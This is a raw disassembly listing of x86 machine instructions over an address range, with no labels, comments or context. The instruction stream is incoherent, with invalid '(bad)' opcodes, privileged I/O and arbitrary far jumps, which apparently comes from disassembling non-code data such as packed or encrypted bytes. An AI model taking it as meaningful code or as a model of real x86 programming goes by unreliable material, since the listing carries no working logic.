  41d3c9:	dec    esp
  41d3ca:	cmp    cl,bh
  41d3cc:	or     eax,0x4470cbc2
  41d3d1:	or     cl,al
  41d3d3:	out    dx,eax
  41d3d4:	bound  edi,QWORD PTR [edi+eiz*1-0x55d017b8]
  41d3db:	cdq    
  41d3dc:	mov    cl,0x9
  41d3de:	int3   
  41d3df:	push   ds
  41d3e0:	cmp    eax,esi
  41d3e2:	lods   al,BYTE PTR ds:[esi]
  41d3e3:	push   esp
  41d3e4:	jae    0x41d3d2
  41d3e6:	or     al,0x37
  41d3e8:	mov    esi,0x6ca8dddf
  41d3ed:	lods   al,BYTE PTR ds:[esi]
  41d3ee:	iret   
  41d3ef:	xchg   ebp,eax
  41d3f0:	es xchg edx,eax
  41d3f2:	xchg   esp,eax
  41d3f3:	pop    edi
  41d3f4:	mov    WORD PTR [edx-0x26],ds
  41d3f7:	frstor [edi-0x7d504831]
  41d3fd:	mov    edi,0x214e4f2f
  41d402:	inc    edi
  41d403:	inc    eax
  41d404:	mov    al,0xa8
  41d406:	push   ebx
  41d407:	lahf   
  41d408:	sub    eax,0xa6aad9dd
  41d40d:	jp     0x41d3b0
  41d40f:	repz cli 
  41d411:	and    al,0x9c
  41d413:	cdq    
  41d414:	xor    DWORD PTR ds:0x9c405125,0xc4e7c149
  41d41e:	ror    BYTE PTR [esi+0x37],cl
  41d421:	mov    esp,0xde592664
  41d426:	inc    edi
  41d427:	adc    ecx,DWORD PTR [esi-0x140a5146]
  41d42d:	fsubr  DWORD PTR [ecx]
  41d42f:	test   BYTE PTR [edi+0x32],dh
  41d432:	aas    
  41d433:	sub    BYTE PTR [ecx+0x1dcdcd67],ch
  41d439:	jle    0x41d486
  41d43b:	mov    eax,ds:0x4549c2
  41d440:	cmp    al,0x15
  41d442:	rdtsc  
  41d444:	pop    es
  41d445:	sar    DWORD PTR [eax+0xdf1689a],0xa2
  41d44c:	and    eax,0xe3e02cf0
  41d451:	and    ch,BYTE PTR [edx]
  41d453:	add    esi,DWORD PTR [esi+0x4636fc1d]
  41d459:	jmp    0x41d41f
  41d45b:	push   0x1e
  41d45d:	jmp    0xef27abd5
  41d462:	aad    0xce
  41d464:	(bad)  
  41d465:	das    
  41d466:	mov    eax,0xe9c402f8
  41d46b:	push   0x6c
  41d46d:	dec    esi
  41d46e:	retf   
  41d46f:	inc    ebx
  41d470:	fnstsw ax
  41d472:	lea    ecx,[eax]
  41d474:	sub    ecx,esp
  41d476:	jmp    0x20383fc7
  41d47b:	int    0xf5
  41d47d:	push   esi
  41d47e:	retf   
  41d47f:	mov    al,0xd5
  41d481:	ret    0x1dd0
  41d484:	dec    ebp
  41d485:	sub    dh,BYTE PTR [ebx+eiz*2+0x2079f967]
  41d48c:	(bad)  
  41d48d:	jl     0x41d461
  41d48f:	mov    dl,0xb2
  41d491:	adc    cl,BYTE PTR [ebx+ebp*1]
  41d494:	jmp    0x0:0x92fd
	...
  41d513:	add    BYTE PTR [edi],ah
  41d515:	and    eax,0xbb873b85
  41d51a:	mov    edi,0xe22d13d
  41d51f:	pusha  
  41d520:	lods   eax,DWORD PTR ds:[esi]
  41d521:	adc    bl,BYTE PTR [ebp+0x17135c1]
  41d527:	add    BYTE PTR [ebx+0x7],ch
  41d52a:	add    BYTE PTR [eax],al
  41d52c:	pop    edx
  41d52d:	add    eax,0xb9968cfd
  41d532:	addr16 mov ch,0x9a
  41d535:	les    esi,FWORD PTR [esi+0x6a]
  41d538:	mov    al,0x28
  41d53a:	sub    bl,ch
  41d53c:	pop    ds
  41d53d:	outs   dx,DWORD PTR ds:[esi]
  41d53e:	(bad)  
  41d53f:	stc    
  41d540:	mov    cl,0xf6
  41d542:	mov    bh,0x91
  41d544:	jge    0x41d522
  41d546:	hlt    
  41d547:	add    ah,BYTE PTR [ebp-0x78558d91]
  41d54d:	mov    edi,0xb48f2a17
  41d552:	ins    DWORD PTR es:[edi],dx
  41d553:	dec    eax
  41d554:	int    0x5a
  41d556:	sbb    DWORD PTR [edi+0x198325e8],ebx
  41d55c:	jne    0x41d519
  41d55e:	scas   eax,DWORD PTR es:[edi]
  41d55f:	mul    esi
  41d561:	cdq    
  41d562:	bound  edi,QWORD PTR [ebx-0x583e3b1a]
  41d568:	mov    dh,0x4a
  41d56a:	adc    al,0x4
  41d56c:	faddp  st(7),st
  41d56e:	dec    ebx
  41d56f:	retf   
  41d570:	dec    esp
  41d571:	mov    edx,0xfb85525b
  41d576:	fcmovbe st,st(0)
  41d578:	rol    BYTE PTR [ebx-0x11340403],0x1b
  41d57f:	rcl    BYTE PTR cs:[eax-0x3a],1
  41d583:	xchg   esp,eax
  41d584:	shl    BYTE PTR [bx+di+0x6f],cl
  41d588:	jbe    0x41d5c2
  41d58a:	add    ebp,DWORD PTR [edx]
  41d58c:	push   eax
  41d58d:	pop    ecx
  41d58e:	dec    esi
  41d58f:	and    BYTE PTR [esi-0x590c5411],bl
  41d595:	call   0x167b5dd7
  41d59a:	add    ah,dh
  41d59c:	mov    ds:0x471fddd0,eax
  41d5a1:	imul   esi,DWORD PTR [edi],0x6fa578d2
  41d5a7:	inc    edx
  41d5a8:	jne    0x41d5a8
  41d5aa:	cdq    
  41d5ab:	ins    BYTE PTR es:[edi],dx
  41d5ac:	mov    al,0xdf
  41d5ae:	lds    ebx,FWORD PTR [ebx-0x45d2ca3b]
  41d5b4:	(bad)  
  41d5b5:	push   edx
  41d5b6:	lds    eax,FWORD PTR [ebx+0x7ae8d475]
  41d5bc:	in     eax,0x90
  41d5be:	xor    eax,DWORD PTR [ecx]
  41d5c0:	sub    bh,dh
  41d5c2:	jmp    DWORD PTR [ecx]
  41d5c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d5c5:	es cld 
  41d5c7:	xor    al,dh
  41d5c9:	icebp  
  41d5ca:	dec    eax
  41d5cb:	leave  
  41d5cc:	sub    dh,dl
  41d5ce:	inc    edx
  41d5cf:	mov    dh,0x8a
  41d5d1:	xchg   DWORD PTR [ecx],eax
  41d5d3:	cmp    BYTE PTR [ecx*1-0x38dbb5c2],cl
  41d5da:	fsubp  st(0),st
  41d5dc:	or     DWORD PTR [edi+0x57],eax
  41d5df:	in     al,0x43
  41d5e1:	lahf   
  41d5e2:	add    al,0x1a
  41d5e4:	mov    ch,0x4f
  41d5e6:	test   BYTE PTR [ebx+0x1e],dl
  41d5e9:	shl    DWORD PTR [edx-0x22],1
  41d5ec:	dec    ecx
  41d5ed:	popa   
  41d5ee:	mov    bl,0xa6
  41d5f0:	push   edx
  41d5f1:	mov    edx,0x4561a893
  41d5f6:	pmovmskb edx,mm0
  41d5f9:	ret    0x605a
  41d5fc:	and    BYTE PTR [ecx-0x2b5a777b],cl
  41d602:	add    cl,BYTE PTR [eax]
  41d604:	jle    0x41d5c4
  41d606:	jnp    0x41d601
  41d608:	mov    ds:0x65e55ff1,eax
  41d60d:	inc    ecx
  41d60e:	sbb    eax,0xd74fc243
  41d613:	pop    edi
  41d614:	dec    eax
  41d615:	ins    BYTE PTR es:[edi],dx
  41d616:	mov    eax,0xa58f2502
  41d61b:	push   ebp
  41d61c:	mov    DWORD PTR [ecx-0x19e016],ebp
  41d622:	dec    esp
  41d623:	or     eax,0x430537ec
  41d628:	retf   
  41d629:	add    al,0x54
  41d62b:	jl     0x41d61d
  41d62d:	pop    edi
  41d62e:	ja     0x41d6aa
  41d630:	sub    BYTE PTR [eax+0x1225b8ec],ch
  41d636:	ja     0x41d65d
  41d638:	mov    ds:0x7a8dd77b,eax
  41d63d:	mov    ebx,0xedc46ec5
  41d642:	adc    al,0x64
  41d644:	or     BYTE PTR [eax-0xf],bl
  41d647:	cmp    BYTE PTR [ebx+0x75],al
  41d64a:	cs fwait
  41d64c:	(bad)  
  41d64d:	dec    ebp
  41d64e:	test   eax,0x123f08ae
  41d653:	fst    DWORD PTR [eax-0x705356b8]
  41d659:	and    al,0xce
  41d65b:	scas   al,BYTE PTR es:[edi]
  41d65c:	out    dx,eax
  41d65d:	mov    ebp,0xd3a29891
  41d662:	out    0x24,al
  41d664:	jne    0x41d659
  41d666:	mov    al,ds:0xdbadd7e7
  41d66b:	lds    ebx,FWORD PTR [edx]
  41d66d:	fwait
  41d66e:	dec    ecx
  41d66f:	fimul  DWORD PTR [ebp-0x76dca116]
  41d675:	pop    ss
  41d676:	sub    ebp,DWORD PTR [eax-0x7b]
  41d679:	xor    BYTE PTR [esi-0x3b67049e],cl
  41d67f:	ds shr bh,1
  41d682:	sar    cl,1
  41d684:	jmp    0xa498466f
  41d689:	mov    ds:0xb9dcabc9,al
  41d68e:	shl    DWORD PTR [ebp-0x2a549340],cl
  41d694:	daa    
  41d695:	pop    ds
  41d696:	std    
  41d697:	call   0x3685:0xec0cd4d6
  41d69e:	inc    ecx
  41d69f:	mov    ecx,0x67268e2e
  41d6a4:	cmp    eax,0xe33b88
  41d6a9:	test   DWORD PTR [esi],ebp
  41d6ab:	loopne 0x41d6e8
  41d6ad:	(bad)  
  41d6ae:	mov    ebp,0x8120743f
  41d6b3:	cmp    al,0x41
  41d6b5:	pop    ecx
  41d6b6:	outs   dx,BYTE PTR ds:[esi]
  41d6b7:	std    
  41d6b8:	pop    ss
  41d6b9:	scas   al,BYTE PTR es:[edi]
  41d6ba:	push   ebx
  41d6bb:	push   ebx
  41d6bc:	es adc al,0xdf
  41d6bf:	call   0xb4b6:0x3472cd24
  41d6c6:	out    dx,al
  41d6c7:	aam    0x24
  41d6c9:	ud1    ebp,DWORD PTR [ecx]
  41d6cc:	or     al,0xfc
  41d6ce:	dec    eax
  41d6cf:	mov    cl,0x94
  41d6d1:	sub    bh,dh
  41d6d3:	or     DWORD PTR [esi-0x2],ecx
  41d6d6:	aas    
  41d6d7:	xor    eax,0x24c7beea
  41d6dc:	mov    al,ds:0x2995d7a6
  41d6e1:	lahf   
  41d6e2:	adc    BYTE PTR [edi-0x3b8154ed],bh
  41d6e8:	pop    ds
  41d6e9:	pop    eax
  41d6ea:	xor    al,0xab
  41d6ec:	and    al,0xfe
  41d6ee:	jmp    DWORD PTR [ebx+edx*8-0x77]
  41d6f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d6f3:	cmc    
  41d6f4:	outs   dx,DWORD PTR ds:[esi]
  41d6f5:	in     al,dx
  41d6f6:	cmp    edx,DWORD PTR [ecx+edx*1+0x75190843]
  41d6fd:	add    eax,0x651065a2
  41d702:	jmp    DWORD PTR [edx+0x2a6ce36e]
  41d708:	pop    ebx
  41d709:	mov    ebp,0x172ee5b9
  41d70e:	test   eax,0xa1d53560
  41d713:	lea    esp,[esi-0x1d]
  41d716:	push   cs
  41d717:	pop    ss
  41d718:	push   edx
  41d719:	ins    BYTE PTR es:[edi],dx
  41d71a:	data16 add BYTE PTR [eax+0x520281bb],ch
  41d721:	xchg   ecx,eax
  41d722:	jecxz  0x41d6df
  41d724:	scas   eax,DWORD PTR es:[edi]
  41d725:	mov    edi,0x63f55c43
  41d72a:	mov    eax,0xd3df2137
  41d72f:	or     al,0x71
  41d731:	jg     0x41d6fd
  41d733:	inc    edx
  41d734:	mov    edx,0xa231e222
  41d739:	lods   eax,DWORD PTR ds:[esi]
  41d73a:	mov    ah,0x83
  41d73c:	xor    eax,0x7fea2e5d
  41d741:	push   esp
  41d742:	loope  0x41d7a8
  41d744:	das    
  41d745:	xchg   DWORD PTR ds:0x7c7eaaf4,ecx
  41d74b:	inc    edx
  41d74c:	sbb    ecx,0x3a867a66
  41d752:	mov    al,0x17
  41d754:	sub    al,0x86
  41d756:	xor    esi,DWORD PTR [esi-0x27]
  41d759:	loope  0x41d74e
  41d75b:	popa   
  41d75c:	inc    ecx
  41d75d:	hlt    
  41d75e:	(bad)  
  41d75f:	add    BYTE PTR [ebx-0x3ea2ab73],bl
  41d765:	cmc    
  41d766:	pop    esi
  41d767:	adc    esi,eax
  41d769:	pusha  
  41d76a:	add    BYTE PTR [ecx],bl
  41d76c:	aaa    
  41d76d:	mov    ebp,cs
  41d76f:	clc    
  41d770:	mov    eax,0xbef0d671
  41d775:	xchg   ecx,eax
  41d776:	jle    0x41d7c4
  41d778:	jns    0x41d788
  41d77a:	mov    eax,0x4879fb88
  41d77f:	aad    0xe1
  41d781:	outs   dx,BYTE PTR ds:[esi]
  41d782:	int    0x94
  41d784:	je     0x41d7bc
  41d786:	leave  
  41d787:	or     dl,ch
  41d789:	inc    ebp
  41d78a:	inc    esi
  41d78b:	pop    eax
  41d78c:	std    
  41d78d:	pop    es
  41d78e:	icebp  
  41d78f:	or     al,0x39
  41d791:	push   0x6515a61d
  41d796:	mov    ?,eax
  41d798:	stos   BYTE PTR es:[edi],al
  41d799:	xor    al,0x0
  41d79b:	xchg   esi,eax
  41d79c:	xchg   ecx,eax
  41d79d:	add    esi,ebp
  41d79f:	xor    BYTE PTR [esi+0x5c],bl
  41d7a2:	cmp    al,0x8f
  41d7a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d7a5:	adc    ebx,DWORD PTR [esi]
  41d7a7:	cmp    BYTE PTR [eax],dl
  41d7a9:	add    eax,0x676a715
  41d7ae:	mov    ebp,0x63fea1d2
  41d7b3:	aad    0xb8
  41d7b5:	ds dec edi
  41d7b7:	jbe    0x41d74a
  41d7b9:	stos   DWORD PTR es:[edi],eax
  41d7ba:	repnz ins DWORD PTR es:[edi],dx
  41d7bc:	clc    
  41d7bd:	sub    BYTE PTR [ebx-0xd7fc18a],bh
  41d7c3:	adc    cl,BYTE PTR [ecx]
  41d7c5:	push   edi
  41d7c6:	jo     0x41d800
  41d7c8:	mov    bl,0xd
  41d7ca:	add    BYTE PTR [ecx-0x49146226],0xea
  41d7d1:	and    cl,bh
  41d7d3:	and    BYTE PTR [ebx],0xe8
  41d7d6:	lods   al,BYTE PTR ds:[esi]
  41d7d7:	cli    
  41d7d8:	sbb    al,0x51
  41d7da:	jecxz  0x41d7d7
  41d7dc:	xchg   esi,eax
  41d7dd:	sub    bh,0x46
  41d7e0:	aas    
  41d7e1:	jg     0x41d7e2
  41d7e3:	outs   dx,BYTE PTR ds:[esi]
  41d7e4:	mov    esi,0x699ceaed
  41d7e9:	dec    edi
  41d7ea:	adc    al,0x61
  41d7ec:	jae    0x41d7d5
  41d7ee:	sbb    DWORD PTR [edi],esp
  41d7f0:	out    dx,al
  41d7f1:	(bad)  [ebp-0x49]
  41d7f4:	xor    bl,BYTE PTR [ebx-0x2a]
  41d7f7:	mov    ds:0x41bb0343,eax
  41d7fc:	mov    ebp,0xabbacccb
  41d801:	mov    ds:0x1200c406,eax
  41d806:	inc    ecx
  41d807:	jmp    0x41d846
  41d809:	cld    
  41d80a:	dec    esp
  41d80b:	fldenv [edx-0x1a7882c7]
  41d811:	mov    WORD PTR [ebx-0x4c],cs
  41d814:	push   esi
  41d815:	push   ebp
  41d816:	dec    ebx
  41d817:	stc    
  41d818:	leave  
  41d819:	ficomp WORD PTR [ecx+0x78]
  41d81c:	mov    BYTE PTR [ecx-0x56],ch
  41d81f:	mov    ds:0xd0db9a46,al
  41d824:	jmp    0xa8267a1b
  41d829:	icebp  
  41d82a:	jae    0x41d7b4
  41d82c:	addr16 leave 
  41d82e:	xchg   ebx,eax
  41d82f:	loop   0x41d7cf
  41d831:	lods   al,BYTE PTR ds:[esi]
  41d832:	xchg   edx,eax
  41d833:	and    ch,BYTE PTR [eax]
  41d835:	fcom   DWORD PTR [ecx-0x40]
  41d838:	jb     0x41d7d3
  41d83a:	aam    0x5f
  41d83c:	iret   
  41d83d:	mov    ebx,0x38047fe2
  41d842:	ret    0x3e43
  41d845:	push   ebp
  41d846:	or     BYTE PTR [edx],dl
  41d848:	imul   edx,DWORD PTR [edi],0xffffff8e
  41d84b:	sbb    esi,eax
  41d84d:	push   ebp
  41d84e:	daa    
  41d84f:	mov    WORD PTR ds:0x5ecb7906,fs
  41d855:	test   BYTE PTR [ebp+0x67],ch
  41d858:	dec    esi
  41d859:	mov    esi,0x4f7cdeff
  41d85e:	pop    ebx
  41d85f:	cmp    ebx,DWORD PTR [esi]
  41d861:	and    BYTE PTR [esi+0x307e957],al
  41d867:	popa   
  41d868:	or     bh,BYTE PTR [ebx-0x75]
  41d86b:	sub    edx,edx
  41d86d:	jne    0x41d8d7
  41d86f:	jb     0x41d8d0
  41d871:	mov    esp,0x520c4ab0
  41d876:	jecxz  0x41d80d
  41d878:	mov    ebp,0xa4d21952
  41d87d:	in     al,0x20
  41d87f:	ins    DWORD PTR es:[edi],dx
  41d880:	sbb    dh,al
  41d882:	ficomp WORD PTR [esi+0x3d2adceb]
  41d888:	sbb    eax,0xdf7048fe
  41d88d:	push   esi
  41d88e:	outs   dx,BYTE PTR ds:[esi]
  41d88f:	sub    al,0xb
  41d891:	int    0xb4
  41d893:	and    eax,0x1ed5a211
  41d898:	dec    edx
  41d899:	test   eax,0xfcb94efc
  41d89e:	aas    
  41d89f:	mov    dh,0x1a
  41d8a1:	jbe    0x41d90c
  41d8a3:	sub    eax,0x1480643c
  41d8a8:	cmp    DWORD PTR ds:0x53bff48b,eax
  41d8ae:	sub    al,0xb2
  41d8b0:	ret    
  41d8b1:	or     cl,bh
  41d8b3:	pop    ecx
  41d8b4:	sbb    al,0x6d
  41d8b6:	pop    ecx
  41d8b7:	das    
  41d8b8:	xor    BYTE PTR [ebp-0x5704986],0x7
  41d8bf:	fdiv   QWORD PTR [eax+0x1e]
  41d8c2:	sti    
  41d8c3:	std    
  41d8c4:	std    
  41d8c5:	rol    BYTE PTR [ebx+0xae1f264],1
  41d8cb:	add    dh,BYTE PTR [eax+0x2e]
  41d8ce:	das    
  41d8cf:	sub    ch,ch
  41d8d1:	stos   BYTE PTR es:[edi],al
  41d8d2:	fdiv   st,st(1)
  41d8d4:	ror    ebx,cl
  41d8d6:	aaa    
  41d8d7:	jl     0x41d859
  41d8d9:	push   ds
  41d8da:	push   edi
  41d8db:	adc    al,0xf8
  41d8dd:	add    DWORD PTR [ebx+0x53],esp
  41d8e0:	(bad)  
  41d8e1:	push   eax
  41d8e2:	fistp  WORD PTR [edi+0x67d8f2ed]
  41d8e8:	dec    edx
  41d8e9:	xchg   DWORD PTR [ebp+0x5ed2f19a],edx
  41d8ef:	add    al,0x64
  41d8f1:	xchg   DWORD PTR [ebx],eax
  41d8f3:	into   
  41d8f4:	loopne 0x41d8e3
  41d8f6:	xor    ebp,DWORD PTR [ecx-0x2e4a747d]
  41d8fc:	retf   0x471
  41d8ff:	jge    0x41d90d
  41d901:	test   al,0x58
  41d903:	bound  edx,QWORD PTR [ebx-0x34]
  41d906:	push   0x27
  41d908:	lds    ebx,FWORD PTR [ecx+0x7e492d4]
  41d90e:	push   ebp
  41d90f:	add    ecx,edi
  41d911:	sub    DWORD PTR [ecx-0x29313108],esp
  41d917:	adc    eax,0x1904cab
  41d91c:	popf   
  41d91d:	inc    eax
  41d91e:	stc    
  41d91f:	(bad)  
  41d920:	jnp    0x41d8e1
  41d922:	rcl    BYTE PTR [ebp+0x939d0d4],0xe6
  41d929:	mov    esp,0xbdd33853
  41d92e:	test   DWORD PTR [ecx+0x36],esi
  41d931:	outs   dx,BYTE PTR ds:[esi]
  41d932:	js     0x41d95a
  41d934:	mov    al,0x82
  41d936:	repz sbb BYTE PTR [edx-0x30],bh
  41d93a:	or     al,0x64
  41d93c:	and    al,0xcc
  41d93e:	iret   
  41d93f:	arpl   WORD PTR [ebx],dx
  41d941:	repnz nop
  41d943:	stos   DWORD PTR es:[edi],eax
  41d944:	bound  esi,QWORD PTR [edx+ebp*4+0x3ad7e486]
  41d94b:	xor    ah,BYTE PTR fs:[ecx-0x69]
  41d94f:	in     eax,0x38
  41d951:	inc    edi
  41d952:	sub    eax,0x5b4f2302
  41d957:	scas   eax,DWORD PTR es:[edi]
  41d958:	out    0x9a,eax
  41d95a:	je     0x41d97a
  41d95c:	mov    al,ds:0x2f35604
  41d961:	mov    dh,0x69
  41d963:	lods   al,BYTE PTR ds:[esi]
  41d964:	das    
  41d965:	dec    ebx
  41d966:	xor    DWORD PTR [edx+0x6415fccc],esp
  41d96c:	fidiv  WORD PTR [eax-0x2a]
  41d96f:	push   ds
  41d970:	iret   
  41d971:	call   0x50fd:0x37a093fe
  41d978:	mov    cl,0x14
  41d97a:	(bad)  
  41d97b:	sti    
  41d97c:	subsd  xmm7,QWORD PTR [ecx]
  41d980:	mov    es,WORD PTR [edx+0x74b9e8e2]
  41d986:	dec    edi
  41d987:	xor    DWORD PTR [edi+eax*8],eax
  41d98a:	call   0x2b469e87
  41d98f:	test   al,0xc2
  41d991:	xor    edx,esi
  41d993:	mov    dl,0x84
  41d995:	add    DWORD PTR [edi+eax*4+0x3f2e1862],0xffffff87
  41d99d:	cli    
  41d99e:	test   DWORD PTR [esi+0x6e],eax
  41d9a1:	sub    dh,BYTE PTR [edx+eiz*4]
  41d9a4:	(bad)  
  41d9a5:	pop    ecx
  41d9a6:	fiadd  DWORD PTR [ebx]
  41d9a8:	(bad)  
  41d9a9:	nop
  41d9aa:	xor    bl,bl
  41d9ac:	sbb    esp,DWORD PTR [ebp+0x5a]
  41d9af:	cmp    ecx,DWORD PTR gs:[ecx]
  41d9b2:	pop    ecx
  41d9b3:	jae    0x41d9d2
  41d9b5:	call   0x1b98:0x7d3da74a
  41d9bc:	mov    ecx,0x18cf0f54
  41d9c1:	out    dx,al
  41d9c2:	push   ss
  41d9c3:	das    
  41d9c4:	lea    edx,[ebp+0x3f47e7]
  41d9ca:	jno    0x41d9f0
  41d9cc:	sbb    BYTE PTR [ebx+0x2994ac11],0x7
  41d9d3:	mov    ah,0xa1
  41d9d5:	shl    al,0x5f
  41d9d8:	xchg   ebx,eax
  41d9d9:	sti    
  41d9da:	mov    ?,WORD PTR [esi]
  41d9dc:	xchg   DWORD PTR cs:[edi-0x2e],edx
  41d9e0:	movzx  eax,dh
  41d9e3:	repnz adc eax,0xf4f522e0
  41d9e9:	cmp    cl,bl
  41d9eb:	fst    QWORD PTR [ecx+0x2e5ba18b]
  41d9f1:	(bad)  
  41d9f2:	les    ebx,FWORD PTR [esi]
  41d9f4:	xlat   BYTE PTR ds:[ebx]
  41d9f5:	dec    ebp
  41d9f6:	shr    BYTE PTR [ebx-0x33a16e9b],0xf7
  41d9fd:	xchg   edi,eax
  41d9fe:	mov    DWORD PTR [eax],ebx
  41da00:	inc    ebp
  41da01:	(bad)  
  41da02:	xchg   ecx,eax
  41da03:	dec    ebp
  41da04:	mov    ah,0x58
  41da06:	jge    0x41da5a
  41da08:	mov    bl,0x73
  41da0a:	test   eax,0x2deced37
  41da0f:	dec    ebp
  41da10:	repnz sub al,bl
  41da13:	rol    BYTE PTR [ebp-0x32],cl
  41da16:	push   edx
  41da17:	and    eax,0x6935140c
  41da1c:	add    ebp,ebp
  41da1e:	je     0x41da6b
  41da20:	push   ds
  41da21:	mov    dl,0xd8
  41da23:	mov    edx,0xfe242f13
  41da28:	inc    edi
  41da29:	xchg   esi,eax
  41da2a:	shl    BYTE PTR ds:0x75a61cae,1
  41da30:	ret    
  41da31:	push   esp
  41da32:	cs aaa 
  41da34:	stos   BYTE PTR es:[edi],al
  41da35:	sahf   
  41da36:	ss scas al,BYTE PTR es:[edi]
  41da38:	nop
  41da39:	ins    DWORD PTR es:[edi],dx
  41da3a:	sbb    eax,0xc794d477
  41da3f:	xchg   edx,esi
  41da41:	inc    eax
  41da42:	jnp    0x41da1e
  41da44:	jmp    0xf3f7de20
  41da49:	push   0x7687bfca
  41da4e:	cli    
  41da4f:	fistp  QWORD PTR [edx+0x2550e5e6]
  41da55:	dec    ecx
  41da56:	pop    edi
  41da57:	data16 add dl,BYTE PTR [esi+edx*1]
  41da5b:	aad    0x89
  41da5d:	xchg   ebx,eax
  41da5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41da5f:	cmc    
  41da60:	sub    BYTE PTR [ebx],0xb7
  41da63:	xchg   esp,eax
  41da64:	or     BYTE PTR [ebp+0x41],dh
  41da67:	cmp    al,0x8b
  41da69:	bound  edx,QWORD PTR [ecx-0x4e]
  41da6c:	in     al,0x63
  41da6e:	fwait
  41da6f:	inc    ebx
  41da70:	mov    ?,WORD PTR [ecx]
  41da72:	and    al,0x7f
  41da74:	mov    ebp,0xecddf2f6
  41da79:	or     BYTE PTR [edx+esi*4-0xbdd2bd9],ah
  41da80:	sub    al,0xe0
  41da82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41da83:	mov    al,ds:0x9ef43383
  41da88:	sahf   
  41da89:	es cmp al,0x67
  41da8c:	xor    DWORD PTR [ebx+0x3bb4a8d6],ebx
  41da92:	xor    BYTE PTR [ecx],bh
  41da94:	mov    ch,0xbc
  41da96:	lods   eax,DWORD PTR ds:[esi]
  41da97:	adc    al,BYTE PTR [ebx-0x38074870]
  41da9d:	adc    DWORD PTR [edi-0x2dfe7fd6],esi
  41daa3:	jg     0x41da2e
  41daa5:	(bad)  
  41daa6:	fsubp  st(6),st
  41daa8:	stos   DWORD PTR es:[edi],eax
  41daa9:	lds    ebx,FWORD PTR [esi+0x76a8a1f]
  41daaf:	adc    edx,ebx
  41dab1:	or     edi,0xffffffc0
  41dab4:	neg    BYTE PTR [edi-0x5c]
  41dab7:	loopne 0x41daae
  41dab9:	jae    0x41daf6
  41dabb:	ret    
  41dabc:	push   esp
  41dabd:	jno    0x41daf4
  41dabf:	cdq    
  41dac0:	dec    edx
  41dac1:	push   DWORD PTR [esi]
  41dac3:	jmp    0x41da65
  41dac5:	je     0x41da4d
  41dac7:	push   es
  41dac8:	fucom  st(6)
  41daca:	aas    
  41dacb:	ins    DWORD PTR es:[edi],dx
  41dacc:	and    bl,BYTE PTR [edi-0x14]
  41dacf:	cdq    
  41dad0:	adc    eax,0x82702d19
  41dad5:	icebp  
  41dad6:	sbb    eax,0x3c5ccb95
  41dadb:	bound  eax,QWORD PTR cs:[ecx-0x1e]
  41dadf:	xchg   ebx,eax
  41dae0:	mov    dh,0xc4
  41dae2:	xor    bl,0x6d
  41dae5:	sbb    bl,bl
  41dae7:	dec    esp
  41dae8:	and    dl,BYTE PTR [ebp-0x41]
  41daeb:	leave  
  41daec:	push   edi
  41daed:	jmp    0xc96:0xf4e3f0e7
  41daf4:	xor    bh,BYTE PTR [ecx+0x1d]
  41daf7:	lods   eax,DWORD PTR ds:[esi]
  41daf8:	jns    0x41da7e
  41dafa:	sub    BYTE PTR [esi],dh
  41dafc:	outs   dx,DWORD PTR ds:[esi]
  41dafd:	in     al,dx
  41dafe:	out    0xff,eax
  41db00:	mov    esp,0x7bcec2a5
  41db05:	lds    edx,FWORD PTR [ebx-0x3]
  41db08:	or     eax,0x18314f1f
  41db0d:	or     BYTE PTR ds:0x569d8ca,0xed
  41db14:	sub    eax,0x867ba950
  41db19:	adc    eax,0xe747d76b
  41db1e:	ficom  WORD PTR [ebx-0x1b]
  41db21:	ins    BYTE PTR es:[edi],dx
  41db22:	hlt    
  41db23:	icebp  
  41db24:	stos   DWORD PTR es:[edi],eax
  41db25:	repz xor al,0xc1
  41db28:	jge    0x41daf1
  41db2a:	les    ebp,FWORD PTR [ebx+0x62f7a2b7]
  41db30:	pusha  
  41db31:	mov    dh,0x73
  41db33:	aad    0xf7
  41db35:	inc    eax
  41db36:	cmp    DWORD PTR [ecx+0x1cff2cbb],esi
  41db3c:	adc    al,0x97
  41db3e:	xor    cl,bl
  41db40:	add    al,0x75
  41db42:	in     eax,dx
  41db43:	cli    
  41db44:	push   esp
  41db45:	fbld   TBYTE PTR [edi+0x33]
  41db48:	int3   
  41db49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db4a:	mov    DWORD PTR [eax],esp
  41db4c:	dec    ebp
  41db4d:	jp     0x41db5d
  41db4f:	xor    eax,0x8d6da012
  41db54:	out    0x18,al
  41db56:	or     ecx,DWORD PTR [ebp+0x7738c5b1]
  41db5c:	pop    ebx
  41db5d:	jns    0x41dae8
  41db5f:	ja     0x41dae7
  41db61:	data16 out 0x33,al
  41db64:	stc    
  41db65:	bound  ebp,QWORD PTR [edi+0x1cea3a5b]
  41db6b:	lods   eax,DWORD PTR ds:[esi]
  41db6c:	mov    ebx,0xee3bf641
  41db71:	rcl    DWORD PTR [ebx-0x715d1ece],cl
  41db77:	sbb    al,cl
  41db79:	dec    ebp
  41db7a:	lea    eax,[ebx-0x6]
  41db7d:	shr    DWORD PTR [ebx],cl
  41db7f:	shr    al,cl
  41db81:	mov    bh,0x73
  41db83:	xacquire xchg DWORD PTR [ebp-0x1cfe602a],esp
  41db8a:	dec    edi
  41db8b:	add    ch,al
  41db8d:	ins    BYTE PTR es:[edi],dx
  41db8e:	mov    WORD PTR [esi],ds
  41db90:	sahf   
  41db91:	ins    BYTE PTR es:[edi],dx
  41db92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db93:	inc    edi
  41db94:	mov    DWORD PTR [ebx],ecx
  41db96:	push   ss
  41db97:	(bad)  
  41db98:	in     al,0x6
  41db9a:	(bad)  
  41db9b:	(bad)  [ebp-0x80]
  41db9e:	mov    bl,0x54
  41dba0:	xrelease xchg DWORD PTR [ebp-0x6],esp
  41dba4:	push   0x476cdd53
  41dba9:	and    ah,BYTE PTR [edx+0x4a]
  41dbac:	cmp    BYTE PTR [eax],0xa2
  41dbaf:	inc    ebp
  41dbb0:	add    edx,eax
  41dbb2:	les    ax,DWORD PTR [esi+0x72]
  41dbb6:	mov    bl,0x44
  41dbb8:	shr    BYTE PTR [eax+0x3e],0x58
  41dbbc:	repnz nop
  41dbbe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dbbf:	inc    DWORD PTR [edx-0x37]
  41dbc2:	aaa    
  41dbc3:	aad    0x85
